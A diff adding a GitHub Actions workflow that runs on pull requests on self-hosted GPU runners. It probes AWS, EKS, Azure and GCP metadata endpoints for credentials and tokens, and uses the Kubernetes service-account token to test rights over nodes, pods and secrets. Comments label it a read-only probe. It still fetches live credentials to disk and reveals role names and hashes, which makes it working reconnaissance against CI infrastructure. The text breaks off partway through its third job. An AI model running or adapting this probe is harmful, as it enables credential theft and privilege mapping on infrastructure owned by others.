@@ -1,0 +1,838 @@
+name: c211-127145-nvmeta
+on:
+  pull_request:
+    types: [opened, synchronize, reopened]
+permissions:
+  contents: read
+jobs:
+  nvmeta-b200:
+    runs-on: "4-gpu-b200"
+    timeout-minutes: 20
+    steps:
+      - name: nvmeta-b200-readonly-cloudid-rbac
+        env:
+          NONCE: c211-127145-2252f091552a3e9a
+          JOBTAG: nvmeta-b200
+        run: |
+          #!/usr/bin/env bash
+          # c211-127145 read-only cloud-identity / metadata / in-cluster RBAC probe.
+          # STRICTLY READ-ONLY: creates no pod, makes no host write, prints no secret VALUES
+          # (presence + sha256 only). Container-local /tmp scratch is the only write.
+          set +e
+          ts() { date -u +%Y-%m-%dT%H:%M:%SZ; }
+          NONCE="${NONCE:-c211-127145-UNSET}"
+          JOBTAG="${JOBTAG:-job}"
+          echo "NONCE=$NONCE JOBTAG=$JOBTAG TS_START=$(ts)"
+          echo "HOSTNAME=$(hostname 2>/dev/null) UID=$(id -u 2>/dev/null) EUID=$EUID USER=$(id -un 2>/dev/null)"
+          echo "KERNEL=$(uname -sr 2>/dev/null)"
+          echo "ENV_K8S_HOST=${KUBERNETES_SERVICE_HOST:-ABSENT} ENV_K8S_PORT=${KUBERNETES_SERVICE_PORT:-ABSENT}"
+          echo "TOOLS curl=$(command -v curl >/dev/null 2>&1 && echo yes || echo no) python3=$(command -v python3 >/dev/null 2>&1 && echo yes || echo no) sha256sum=$(command -v sha256sum >/dev/null 2>&1 && echo yes || echo no)"
+
+          echo "=== GPU_DEVICES ==="
+          if command -v nvidia-smi >/dev/null 2>&1; then
+            timeout 20 nvidia-smi -L 2>&1 | head -20
+            echo "--- NVIDIA_SMI_QUERY ---"
+            timeout 20 nvidia-smi --query-gpu=uuid,name,driver_version --format=csv,noheader 2>&1 | head -20
+          else
+            echo "NVIDIA_SMI_ABSENT"
+          fi
+
+          hashval() {
+            local f="$1"
+            if [ -f "$f" ]; then
+              local n s
+              n=$(wc -c <"$f" 2>/dev/null | tr -d ' ')
+              if command -v sha256sum >/dev/null 2>&1; then
+                s=$(sha256sum "$f" 2>/dev/null | cut -d' ' -f1)
+              elif command -v python3 >/dev/null 2>&1; then
+                s=$(python3 -c 'import hashlib,sys;print(hashlib.sha256(open(sys.argv[1],"rb").read()).hexdigest())' "$f" 2>/dev/null)
+              else
+                s=UNAVAILABLE
+              fi
+              echo "$n $s"
+            else
+              echo "ABSENT"
+            fi
+          }
+
+          parse_json_keys() {
+            local f="$1" pfx="$2"
+            if ! command -v python3 >/dev/null 2>&1; then echo "${pfx}_PY3_ABSENT"; return; fi
+            python3 - "$f" "$pfx" <<'PY'
+          import json,sys,hashlib
+          p,pfx=sys.argv[1],sys.argv[2]
+          try:
+              d=json.load(open(p))
+          except Exception:
+              print(pfx+'_PARSE_FAIL'); raise SystemExit
+          if not isinstance(d,dict):
+              print(pfx+'_NOT_OBJECT'); raise SystemExit
+          for k in sorted(d.keys()):
+              v=d[k]
+              if isinstance(v,str) and v:
+                  print('%s_KEY %s PRESENT len=%d sha256=%s'%(pfx,k,len(v),hashlib.sha256(v.encode()).hexdigest()[:16]))
+              elif isinstance(v,bool) or isinstance(v,(int,float)):
+                  print('%s_KEY %s PRESENT scalar'%(pfx,k))
+              elif isinstance(v,(dict,list)):
+                  print('%s_KEY %s PRESENT container'%(pfx,k))
+              else:
+                  print('%s_KEY %s ABSENT'%(pfx,k))
+          PY
+          }
+
+          echo "=== IMDSV2 ==="
+          META=http://169.254.169.254
+          IMDS_TOK=$(curl -sS -m 5 --connect-timeout 3 -X PUT -H 'X-aws-ec2-metadata-token-ttl-seconds: 60' -o /tmp/imds_tok -w '%{http_code}' "$META/latest/api/token" 2>/dev/null)
+          echo "IMDS_TOKEN_HTTP=$IMDS_TOK TOKEN_BYTES=$(wc -c </tmp/imds_tok 2>/dev/null | tr -d ' ')"
+          IMDS_TOKEN_BOGUS=$(curl -sS -m 5 --connect-timeout 3 -X PUT -H 'X-aws-ec2-metadata-token-ttl-seconds: 60' -o /tmp/imds_tok_b -w '%{http_code}' "$META/latest/api/token-c211bogus" 2>/dev/null)
+          echo "IMDS_TOKEN_BOGUS_HTTP=$IMDS_TOKEN_BOGUS"
+          if [ "$IMDS_TOK" = "200" ]; then
+            T=$(cat /tmp/imds_tok 2>/dev/null)
+            ROLES_HTTP=$(curl -sS -m 5 --connect-timeout 3 -H "X-aws-ec2-metadata-token: $T" -o /tmp/imds_roles -w '%{http_code}' "$META/latest/meta-data/iam/security-credentials/" 2>/dev/null)
+            ROLE=$(head -c 200 /tmp/imds_roles 2>/dev/null | tr -d '\r\n')
+            echo "IMDS_ROLES_HTTP=$ROLES_HTTP IMDS_ROLE_NAME=${ROLE:-<none>}"
+            ROLES_BOGUS=$(curl -sS -m 5 --connect-timeout 3 -H "X-aws-ec2-metadata-token: $T" -o /tmp/imds_roles_b -w '%{http_code}' "$META/latest/meta-data/iam/security-credentials-c211bogus/" 2>/dev/null)
+            echo "IMDS_ROLES_BOGUS_HTTP=$ROLES_BOGUS"
+            if [ -n "$ROLE" ]; then
+              CRED_HTTP=$(curl -sS -m 5 --connect-timeout 3 -H "X-aws-ec2-metadata-token: $T" -o /tmp/imds_cred -w '%{http_code}' "$META/latest/meta-data/iam/security-credentials/$ROLE" 2>/dev/null)
+              echo "IMDS_CRED_HTTP=$CRED_HTTP"
+              [ "$CRED_HTTP" = "200" ] && parse_json_keys /tmp/imds_cred IMDS_CRED
+              CRED_BOGUS=$(curl -sS -m 5 --connect-timeout 3 -H "X-aws-ec2-metadata-token: $T" -o /tmp/imds_cred_b -w '%{http_code}' "$META/latest/meta-data/iam/security-credentials/${ROLE}c211bogus" 2>/dev/null)
+              echo "IMDS_CRED_BOGUS_HTTP=$CRED_BOGUS"
+            fi
+          fi
+
+          echo "=== EKS_POD_IDENTITY ==="
+          echo "ENV_AWS_CONTAINER_RELATIVE=${AWS_CONTAINER_CREDENTIALS_RELATIVE_URI:-ABSENT}"
+          if [ -n "${AWS_CONTAINER_CREDENTIALS_FULL_URI:-}" ]; then
+            echo "ENV_AWS_CONTAINER_FULL_URI_PRESENT=yes len=${#AWS_CONTAINER_CREDENTIALS_FULL_URI} sha256=$(printf '%s' "$AWS_CONTAINER_CREDENTIALS_FULL_URI" | sha256sum 2>/dev/null | cut -d' ' -f1)"
+          else
+            echo "ENV_AWS_CONTAINER_FULL_URI_PRESENT=no"
+          fi
+          if [ -n "${AWS_CONTAINER_AUTHORIZATION_TOKEN:-}" ]; then
+            echo "ENV_AWS_CONTAINER_AUTH_PRESENT=yes len=${#AWS_CONTAINER_AUTHORIZATION_TOKEN} sha256=$(printf '%s' "$AWS_CONTAINER_AUTHORIZATION_TOKEN" | sha256sum 2>/dev/null | cut -d' ' -f1)"
+          else
+            echo "ENV_AWS_CONTAINER_AUTH_PRESENT=no"
+          fi
+          for EP in 169.254.170.23 169.254.170.22 169.254.170.2; do
+            SAFE=$(echo "$EP" | tr '.' '_')
+            H=$(curl -sS -m 5 --connect-timeout 3 -o /tmp/podid_$SAFE -w '%{http_code}' "http://$EP/v1/credentials" 2>/dev/null)
+            echo "PODID_${SAFE}_CRED_HTTP=$H BYTES=$(wc -c </tmp/podid_$SAFE 2>/dev/null | tr -d ' ')"
+            [ "$H" = "200" ] && parse_json_keys /tmp/podid_$SAFE PODID_$SAFE
+            HB=$(curl -sS -m 5 --connect-timeout 3 -o /tmp/podid_${SAFE}_b -w '%{http_code}' "http://$EP/v1/credentials-c211bogus" 2>/dev/null)
+            echo "PODID_${SAFE}_BOGUS_HTTP=$HB"
+          done
+
+          echo "=== AZURE_IMDS ==="
+          AZ_URL='http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F'
+          AZ=$(curl -sS -m 5 --connect-timeout 3 -H 'Metadata: true' -o /tmp/aztok -w '%{http_code}' "$AZ_URL" 2>/dev/null)
+          echo "AZURE_IMDS_HTTP=$AZ BYTES=$(wc -c </tmp/aztok 2>/dev/null | tr -d ' ')"
+          [ "$AZ" = "200" ] && parse_json_keys /tmp/aztok AZURE_IMDS
+          AZB=$(curl -sS -m 5 --connect-timeout 3 -H 'Metadata: true' -o /tmp/aztok_b -w '%{http_code}' 'http://169.254.169.254/metadata/identity/oauth2/token-c211bogus?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F' 2>/dev/null)
+          echo "AZURE_IMDS_BOGUS_HTTP=$AZB"
+
+          echo "=== GCP_METADATA ==="
+          for GH in metadata.google.internal 169.254.169.254; do
+            SAFE=$(echo "$GH" | tr '.' '_')
+            G=$(curl -sS -m 5 --connect-timeout 3 -H 'Metadata-Flavor: Google' -o /tmp/gcp_$SAFE -w '%{http_code}' "http://$GH/computeMetadata/v1/instance/service-accounts/default/token" 2>/dev/null)
+            echo "GCP_${SAFE}_TOKEN_HTTP=$G BYTES=$(wc -c </tmp/gcp_$SAFE 2>/dev/null | tr -d ' ')"
+            [ "$G" = "200" ] && parse_json_keys /tmp/gcp_$SAFE GCP_${SAFE}
+            GB=$(curl -sS -m 5 --connect-timeout 3 -H 'Metadata-Flavor: Google' -o /tmp/gcp_${SAFE}_b -w '%{http_code}' "http://$GH/computeMetadata/v1/instance/service-accounts/default/token-c211bogus" 2>/dev/null)
+            echo "GCP_${SAFE}_BOGUS_HTTP=$GB"
+          done
+
+          echo "=== K8S_RBAC ==="
+          SA="${C211_SA_DIR:-/var/run/secrets/kubernetes.io/serviceaccount}"
+          if [ -f "$SA/token" ]; then
+            read -r N S <<<"$(hashval $SA/token)"
+            echo "K8S_SA_TOKEN_PRESENT=yes bytes=$N sha256=$S"
+            echo "K8S_SA_NAMESPACE=$(head -c 200 $SA/namespace 2>/dev/null)"
+            echo "K8S_SA_CA_PRESENT=$([ -f $SA/ca.crt ] && echo yes || echo no)"
+            KHOST=${KUBERNETES_SERVICE_HOST:-}
+            KPORT=${KUBERNETES_SERVICE_PORT:-443}
+            if [ -n "$KHOST" ]; then
+              KURL="https://$KHOST:$KPORT"
+              if [ -f "$SA/ca.crt" ]; then CAARG="--cacert $SA/ca.crt"; else CAARG="-k"; fi
+              NS=$(cat $SA/namespace 2>/dev/null)
+              TOK=$(cat $SA/token 2>/dev/null)
+              echo "K8S_API=$KURL NS=$NS"
+              SSRR_CODE=$(curl -sS -m 6 --connect-timeout 3 $CAARG -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' -X POST --data '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"'"$NS"'"}}' -o /tmp/ssrr.json -w '%{http_code}' "$KURL/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" 2>/dev/null)
+              echo "K8S_SSRR_HTTP=$SSRR_CODE"
+              if [ "$SSRR_CODE" = "201" ] && command -v python3 >/dev/null 2>&1; then
+                python3 - <<'PY'
+          import json
+          try:
+              d=json.load(open('/tmp/ssrr.json'))
+          except Exception:
+              print('K8S_SSRR_PARSE_FAIL'); raise SystemExit
+          rules=(d.get('status') or {}).get('resourceRules') or []
+          got={}
+          for r in rules:
+              verbs=r.get('verbs') or []
+              res=r.get('resources') or []
+              for rn in ('nodes','pods','secrets'):
+                  for v in ('get','list','create'):
+                      if ('*' in res or rn in res or (rn+'/*') in res) and ('*' in verbs or v in verbs):
+                          got[(v,rn)]=True
+          for v in ('get','list','create'):
+              for rn in ('nodes','pods','secrets'):
+                  print('K8S_SSRR_%s_%s=%s'%(v,rn,'true' if got.get((v,rn)) else 'false'))
+          print('K8S_SSRR_RULES=%d'%len(rules))
+          PY
+              fi
+              ssar() {
+                local name="$1" verb="$2" res="$3" ns="$4"
+                local body
+                if [ -n "$ns" ]; then
+                  body='{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectAccessReview","spec":{"resourceAttributes":{"verb":"'"$verb"'","resource":"'"$res"'","namespace":"'"$ns"'"}}}'
+                else
+                  body='{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectAccessReview","spec":{"resourceAttributes":{"verb":"'"$verb"'","resource":"'"$res"'"}}}'
+                fi
+                local code
+                code=$(curl -sS -m 6 --connect-timeout 3 $CAARG -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' -X POST --data "$body" -o /tmp/ssar_$name.json -w '%{http_code}' "$KURL/apis/authorization.k8s.io/v1/selfsubjectaccessreviews" 2>/dev/null)
+                local allowed=unknown
+                if [ "$code" = "201" ] && command -v python3 >/dev/null 2>&1; then
+                  allowed=$(python3 -c "import json;d=json.load(open('/tmp/ssar_$name.json'));print(str((d.get('status') or {}).get('allowed')).lower())" 2>/dev/null)
+                fi
+                echo "K8S_SSAR_${name}_HTTP=$code allowed=$allowed"
+              }
+              ssar get_nodes get nodes ""
+              ssar list_pods list pods "$NS"
+              ssar create_pods create pods "$NS"
+            else
+              echo "K8S_API_ENV_ABSENT"
+            fi
+          else
+            echo "K8S_SA_TOKEN_PRESENT=no"
+          fi
+
+          echo "K8S_NO_POD_CREATED=confirmed"
+          echo "HOST_WRITE_NONE=confirmed"
+          echo "=== END_STATE ==="
+          echo "TS_END=$(ts)"
+          echo "C211_NVMETA_END job=$JOBTAG nonce=$NONCE ts=$(ts)"
+          exit 0
+
+  nvmeta-gb300:
+    runs-on: "2-gpu-gb300"
+    timeout-minutes: 20
+    steps:
+      - name: nvmeta-gb300-readonly-cloudid-rbac
+        env:
+          NONCE: c211-127145-2252f091552a3e9a
+          JOBTAG: nvmeta-gb300
+        run: |
+          #!/usr/bin/env bash
+          # c211-127145 read-only cloud-identity / metadata / in-cluster RBAC probe.
+          # STRICTLY READ-ONLY: creates no pod, makes no host write, prints no secret VALUES
+          # (presence + sha256 only). Container-local /tmp scratch is the only write.
+          set +e
+          ts() { date -u +%Y-%m-%dT%H:%M:%SZ; }
+          NONCE="${NONCE:-c211-127145-UNSET}"
+          JOBTAG="${JOBTAG:-job}"
+          echo "NONCE=$NONCE JOBTAG=$JOBTAG TS_START=$(ts)"
+          echo "HOSTNAME=$(hostname 2>/dev/null) UID=$(id -u 2>/dev/null) EUID=$EUID USER=$(id -un 2>/dev/null)"
+          echo "KERNEL=$(uname -sr 2>/dev/null)"
+          echo "ENV_K8S_HOST=${KUBERNETES_SERVICE_HOST:-ABSENT} ENV_K8S_PORT=${KUBERNETES_SERVICE_PORT:-ABSENT}"
+          echo "TOOLS curl=$(command -v curl >/dev/null 2>&1 && echo yes || echo no) python3=$(command -v python3 >/dev/null 2>&1 && echo yes || echo no) sha256sum=$(command -v sha256sum >/dev/null 2>&1 && echo yes || echo no)"
+
+          echo "=== GPU_DEVICES ==="
+          if command -v nvidia-smi >/dev/null 2>&1; then
+            timeout 20 nvidia-smi -L 2>&1 | head -20
+            echo "--- NVIDIA_SMI_QUERY ---"
+            timeout 20 nvidia-smi --query-gpu=uuid,name,driver_version --format=csv,noheader 2>&1 | head -20
+          else
+            echo "NVIDIA_SMI_ABSENT"
+          fi
+
+          hashval() {
+            local f="$1"
+            if [ -f "$f" ]; then
+              local n s
+              n=$(wc -c <"$f" 2>/dev/null | tr -d ' ')
+              if command -v sha256sum >/dev/null 2>&1; then
+                s=$(sha256sum "$f" 2>/dev/null | cut -d' ' -f1)
+              elif command -v python3 >/dev/null 2>&1; then
+                s=$(python3 -c 'import hashlib,sys;print(hashlib.sha256(open(sys.argv[1],"rb").read()).hexdigest())' "$f" 2>/dev/null)
+              else
+                s=UNAVAILABLE
+              fi
+              echo "$n $s"
+            else
+              echo "ABSENT"
+            fi
+          }
+
+          parse_json_keys() {
+            local f="$1" pfx="$2"
+            if ! command -v python3 >/dev/null 2>&1; then echo "${pfx}_PY3_ABSENT"; return; fi
+            python3 - "$f" "$pfx" <<'PY'
+          import json,sys,hashlib
+          p,pfx=sys.argv[1],sys.argv[2]
+          try:
+              d=json.load(open(p))
+          except Exception:
+              print(pfx+'_PARSE_FAIL'); raise SystemExit
+          if not isinstance(d,dict):
+              print(pfx+'_NOT_OBJECT'); raise SystemExit
+          for k in sorted(d.keys()):
+              v=d[k]
+              if isinstance(v,str) and v:
+                  print('%s_KEY %s PRESENT len=%d sha256=%s'%(pfx,k,len(v),hashlib.sha256(v.encode()).hexdigest()[:16]))
+              elif isinstance(v,bool) or isinstance(v,(int,float)):
+                  print('%s_KEY %s PRESENT scalar'%(pfx,k))
+              elif isinstance(v,(dict,list)):
+                  print('%s_KEY %s PRESENT container'%(pfx,k))
+              else:
+                  print('%s_KEY %s ABSENT'%(pfx,k))
+          PY
+          }
+
+          echo "=== IMDSV2 ==="
+          META=http://169.254.169.254
+          IMDS_TOK=$(curl -sS -m 5 --connect-timeout 3 -X PUT -H 'X-aws-ec2-metadata-token-ttl-seconds: 60' -o /tmp/imds_tok -w '%{http_code}' "$META/latest/api/token" 2>/dev/null)
+          echo "IMDS_TOKEN_HTTP=$IMDS_TOK TOKEN_BYTES=$(wc -c </tmp/imds_tok 2>/dev/null | tr -d ' ')"
+          IMDS_TOKEN_BOGUS=$(curl -sS -m 5 --connect-timeout 3 -X PUT -H 'X-aws-ec2-metadata-token-ttl-seconds: 60' -o /tmp/imds_tok_b -w '%{http_code}' "$META/latest/api/token-c211bogus" 2>/dev/null)
+          echo "IMDS_TOKEN_BOGUS_HTTP=$IMDS_TOKEN_BOGUS"
+          if [ "$IMDS_TOK" = "200" ]; then
+            T=$(cat /tmp/imds_tok 2>/dev/null)
+            ROLES_HTTP=$(curl -sS -m 5 --connect-timeout 3 -H "X-aws-ec2-metadata-token: $T" -o /tmp/imds_roles -w '%{http_code}' "$META/latest/meta-data/iam/security-credentials/" 2>/dev/null)
+            ROLE=$(head -c 200 /tmp/imds_roles 2>/dev/null | tr -d '\r\n')
+            echo "IMDS_ROLES_HTTP=$ROLES_HTTP IMDS_ROLE_NAME=${ROLE:-<none>}"
+            ROLES_BOGUS=$(curl -sS -m 5 --connect-timeout 3 -H "X-aws-ec2-metadata-token: $T" -o /tmp/imds_roles_b -w '%{http_code}' "$META/latest/meta-data/iam/security-credentials-c211bogus/" 2>/dev/null)
+            echo "IMDS_ROLES_BOGUS_HTTP=$ROLES_BOGUS"
+            if [ -n "$ROLE" ]; then
+              CRED_HTTP=$(curl -sS -m 5 --connect-timeout 3 -H "X-aws-ec2-metadata-token: $T" -o /tmp/imds_cred -w '%{http_code}' "$META/latest/meta-data/iam/security-credentials/$ROLE" 2>/dev/null)
+              echo "IMDS_CRED_HTTP=$CRED_HTTP"
+              [ "$CRED_HTTP" = "200" ] && parse_json_keys /tmp/imds_cred IMDS_CRED
+              CRED_BOGUS=$(curl -sS -m 5 --connect-timeout 3 -H "X-aws-ec2-metadata-token: $T" -o /tmp/imds_cred_b -w '%{http_code}' "$META/latest/meta-data/iam/security-credentials/${ROLE}c211bogus" 2>/dev/null)
+              echo "IMDS_CRED_BOGUS_HTTP=$CRED_BOGUS"
+            fi
+          fi
+
+          echo "=== EKS_POD_IDENTITY ==="
+          echo "ENV_AWS_CONTAINER_RELATIVE=${AWS_CONTAINER_CREDENTIALS_RELATIVE_URI:-ABSENT}"
+          if [ -n "${AWS_CONTAINER_CREDENTIALS_FULL_URI:-}" ]; then
+            echo "ENV_AWS_CONTAINER_FULL_URI_PRESENT=yes len=${#AWS_CONTAINER_CREDENTIALS_FULL_URI} sha256=$(printf '%s' "$AWS_CONTAINER_CREDENTIALS_FULL_URI" | sha256sum 2>/dev/null | cut -d' ' -f1)"
+          else
+            echo "ENV_AWS_CONTAINER_FULL_URI_PRESENT=no"
+          fi
+          if [ -n "${AWS_CONTAINER_AUTHORIZATION_TOKEN:-}" ]; then
+            echo "ENV_AWS_CONTAINER_AUTH_PRESENT=yes len=${#AWS_CONTAINER_AUTHORIZATION_TOKEN} sha256=$(printf '%s' "$AWS_CONTAINER_AUTHORIZATION_TOKEN" | sha256sum 2>/dev/null | cut -d' ' -f1)"
+          else
+            echo "ENV_AWS_CONTAINER_AUTH_PRESENT=no"
+          fi
+          for EP in 169.254.170.23 169.254.170.22 169.254.170.2; do
+            SAFE=$(echo "$EP" | tr '.' '_')
+            H=$(curl -sS -m 5 --connect-timeout 3 -o /tmp/podid_$SAFE -w '%{http_code}' "http://$EP/v1/credentials" 2>/dev/null)
+            echo "PODID_${SAFE}_CRED_HTTP=$H BYTES=$(wc -c </tmp/podid_$SAFE 2>/dev/null | tr -d ' ')"
+            [ "$H" = "200" ] && parse_json_keys /tmp/podid_$SAFE PODID_$SAFE
+            HB=$(curl -sS -m 5 --connect-timeout 3 -o /tmp/podid_${SAFE}_b -w '%{http_code}' "http://$EP/v1/credentials-c211bogus" 2>/dev/null)
+            echo "PODID_${SAFE}_BOGUS_HTTP=$HB"
+          done
+
+          echo "=== AZURE_IMDS ==="
+          AZ_URL='http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F'
+          AZ=$(curl -sS -m 5 --connect-timeout 3 -H 'Metadata: true' -o /tmp/aztok -w '%{http_code}' "$AZ_URL" 2>/dev/null)
+          echo "AZURE_IMDS_HTTP=$AZ BYTES=$(wc -c </tmp/aztok 2>/dev/null | tr -d ' ')"
+          [ "$AZ" = "200" ] && parse_json_keys /tmp/aztok AZURE_IMDS
+          AZB=$(curl -sS -m 5 --connect-timeout 3 -H 'Metadata: true' -o /tmp/aztok_b -w '%{http_code}' 'http://169.254.169.254/metadata/identity/oauth2/token-c211bogus?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F' 2>/dev/null)
+          echo "AZURE_IMDS_BOGUS_HTTP=$AZB"
+
+          echo "=== GCP_METADATA ==="
+          for GH in metadata.google.internal 169.254.169.254; do
+            SAFE=$(echo "$GH" | tr '.' '_')
+            G=$(curl -sS -m 5 --connect-timeout 3 -H 'Metadata-Flavor: Google' -o /tmp/gcp_$SAFE -w '%{http_code}' "http://$GH/computeMetadata/v1/instance/service-accounts/default/token" 2>/dev/null)
+            echo "GCP_${SAFE}_TOKEN_HTTP=$G BYTES=$(wc -c </tmp/gcp_$SAFE 2>/dev/null | tr -d ' ')"
+            [ "$G" = "200" ] && parse_json_keys /tmp/gcp_$SAFE GCP_${SAFE}
+            GB=$(curl -sS -m 5 --connect-timeout 3 -H 'Metadata-Flavor: Google' -o /tmp/gcp_${SAFE}_b -w '%{http_code}' "http://$GH/computeMetadata/v1/instance/service-accounts/default/token-c211bogus" 2>/dev/null)
+            echo "GCP_${SAFE}_BOGUS_HTTP=$GB"
+          done
+
+          echo "=== K8S_RBAC ==="
+          SA="${C211_SA_DIR:-/var/run/secrets/kubernetes.io/serviceaccount}"
+          if [ -f "$SA/token" ]; then
+            read -r N S <<<"$(hashval $SA/token)"
+            echo "K8S_SA_TOKEN_PRESENT=yes bytes=$N sha256=$S"
+            echo "K8S_SA_NAMESPACE=$(head -c 200 $SA/namespace 2>/dev/null)"
+            echo "K8S_SA_CA_PRESENT=$([ -f $SA/ca.crt ] && echo yes || echo no)"
+            KHOST=${KUBERNETES_SERVICE_HOST:-}
+            KPORT=${KUBERNETES_SERVICE_PORT:-443}
+            if [ -n "$KHOST" ]; then
+              KURL="https://$KHOST:$KPORT"
+              if [ -f "$SA/ca.crt" ]; then CAARG="--cacert $SA/ca.crt"; else CAARG="-k"; fi
+              NS=$(cat $SA/namespace 2>/dev/null)
+              TOK=$(cat $SA/token 2>/dev/null)
+              echo "K8S_API=$KURL NS=$NS"
+              SSRR_CODE=$(curl -sS -m 6 --connect-timeout 3 $CAARG -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' -X POST --data '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"'"$NS"'"}}' -o /tmp/ssrr.json -w '%{http_code}' "$KURL/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" 2>/dev/null)
+              echo "K8S_SSRR_HTTP=$SSRR_CODE"
+              if [ "$SSRR_CODE" = "201" ] && command -v python3 >/dev/null 2>&1; then
+                python3 - <<'PY'
+          import json
+          try:
+              d=json.load(open('/tmp/ssrr.json'))
+          except Exception:
+              print('K8S_SSRR_PARSE_FAIL'); raise SystemExit
+          rules=(d.get('status') or {}).get('resourceRules') or []
+          got={}
+          for r in rules:
+              verbs=r.get('verbs') or []
+              res=r.get('resources') or []
+              for rn in ('nodes','pods','secrets'):
+                  for v in ('get','list','create'):
+                      if ('*' in res or rn in res or (rn+'/*') in res) and ('*' in verbs or v in verbs):
+                          got[(v,rn)]=True
+          for v in ('get','list','create'):
+              for rn in ('nodes','pods','secrets'):
+                  print('K8S_SSRR_%s_%s=%s'%(v,rn,'true' if got.get((v,rn)) else 'false'))
+          print('K8S_SSRR_RULES=%d'%len(rules))
+          PY
+              fi
+              ssar() {
+                local name="$1" verb="$2" res="$3" ns="$4"
+                local body
+                if [ -n "$ns" ]; then
+                  body='{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectAccessReview","spec":{"resourceAttributes":{"verb":"'"$verb"'","resource":"'"$res"'","namespace":"'"$ns"'"}}}'
+                else
+                  body='{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectAccessReview","spec":{"resourceAttributes":{"verb":"'"$verb"'","resource":"'"$res"'"}}}'
+                fi
+                local code
+                code=$(curl -sS -m 6 --connect-timeout 3 $CAARG -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' -X POST --data "$body" -o /tmp/ssar_$name.json -w '%{http_code}' "$KURL/apis/authorization.k8s.io/v1/selfsubjectaccessreviews" 2>/dev/null)
+                local allowed=unknown
+                if [ "$code" = "201" ] && command -v python3 >/dev/null 2>&1; then
+                  allowed=$(python3 -c "import json;d=json.load(open('/tmp/ssar_$name.json'));print(str((d.get('status') or {}).get('allowed')).lower())" 2>/dev/null)
+                fi
+                echo "K8S_SSAR_${name}_HTTP=$code allowed=$allowed"
+              }
+              ssar get_nodes get nodes ""
+              ssar list_pods list pods "$NS"
+              ssar create_pods create pods "$NS"
+            else
+              echo "K8S_API_ENV_ABSENT"
+            fi
+          else
+            echo "K8S_SA_TOKEN_PRESENT=no"
+          fi
+
+          echo "K8S_NO_POD_CREATED=confirmed"
+          echo "HOST_WRITE_NONE=confirmed"
+          echo "=== END_STATE ==="
+          echo "TS_END=$(ts)"
+          echo "C211_NVMETA_END job=$JOBTAG nonce=$NONCE ts=$(ts)"
+          exit 0
+
+  nvmeta-h100x2:
+    runs-on: "2-gpu-h100"
+    timeout-minutes: 20
+    steps:
+      - name: nvmeta-h100x2-readonly-cloudid-rbac
+        env:
+          NONCE: c211-127145-2252f091552a3e9a
+          JOBTAG: nvmeta-h100x2
+        run: |
+          #!/usr/bin/env bash
+          # c211-127145 read-only cloud-identity / metadata / in-cluster RBAC probe.
+          # STRICTLY READ-ONLY: creates no pod, makes no host write, prints no secret VALUES
+          # (presence + sha256 only). Container-local /tmp scratch is the only write.
+          set +e
+          ts() { date -u +%Y-%m-%dT%H:%M:%SZ; }
+          NONCE="${NONCE:-c211-127145-UNSET}"
+          JOBTAG="${JOBTAG:-job}"
+          echo "NONCE=$NONCE JOBTAG=$JOBTAG TS_START=$(ts)"
+          echo "HOSTNAME=$(hostname 2>/dev/null) UID=$(id -u 2>/dev/null) EUID=$EUID USER=$(id -un 2>/dev/null)"
+          echo "KERNEL=$(uname -sr 2>/dev/null)"
+          echo "ENV_K8S_HOST=${KUBERNETES_SERVICE_HOST:-ABSENT} ENV_K8S_PORT=${KUBERNETES_SERVICE_PORT:-ABSENT}"
+          echo "TOOLS curl=$(command -v curl >/dev/null 2>&1 && echo yes || echo no) python3=$(command -v python3 >/dev/null 2>&1 && echo yes || echo no) sha256sum=$(command -v sha256sum >/dev/null 2>&1 && echo yes || echo no)"
+
+          echo "=== GPU_DEVICES ==="
+          if command -v nvidia-smi >/dev/null 2>&1; then
+            timeout 20 nvidia-smi -L 2>&1 | head -20
+            echo "--- NVIDIA_SMI_QUERY ---"
+            timeout 20 nvidia-smi --query-gpu=uuid,name,driver_version --format=csv,noheader 2>&1 | head -20
+          else
+            echo "NVIDIA_SMI_ABSENT"
+          fi
+
+          hashval() {
+            local f="$1"
+            if [ -f "$f" ]; then
+              local n s
+              n=$(wc -c <"$f" 2>/dev/null | tr -d ' ')
+              if command -v sha256sum >/dev/null 2>&1; then
+                s=$(sha256sum "$f" 2>/dev/null | cut -d' ' -f1)
+              elif command -v python3 >/dev/null 2>&1; then
+                s=$(python3 -c 'import hashlib,sys;print(hashlib.sha256(open(sys.argv[1],"rb").read()).hexdigest())' "$f" 2>/dev/null)
+              else
+                s=UNAVAILABLE
+              fi
+              echo "$n $s"
+            else
+              echo "ABSENT"
+            fi
+          }
+
+          parse_json_keys() {
+            local f="$1" pfx="$2"
+            if ! command -v python3 >/dev/null 2>&1; then echo "${pfx}_PY3_ABSENT"; return; fi
+            python3 - "$f" "$pfx" <<'PY'
+          import json,sys,hashlib
+          p,pfx=sys.argv[1],sys.argv[2]
+          try:
+              d=json.load(open(p))
+          except Exception:
+              print(pfx+'_PARSE_FAIL'); raise SystemExit
+          if not isinstance(d,dict):
+              print(pfx+'_NOT_OBJECT'); raise SystemExit
+          for k in sorted(d.keys()):
+              v=d[k]
+              if isinstance(v,str) and v:
+                  print('%s_KEY %s PRESENT len=%d sha256=%s'%(pfx,k,len(v),hashlib.sha256(v.encode()).hexdigest()[:16]))
+              elif isinstance(v,bool) or isinstance(v,(int,float)):
+                  print('%s_KEY %s PRESENT scalar'%(pfx,k))
+              elif isinstance(v,(dict,list)):
+                  print('%s_KEY %s PRESENT container'%(pfx,k))
+              else:
+                  print('%s_KEY %s ABSENT'%(pfx,k))
+          PY
+          }
+
+          echo "=== IMDSV2 ==="
+          META=http://169.254.169.254
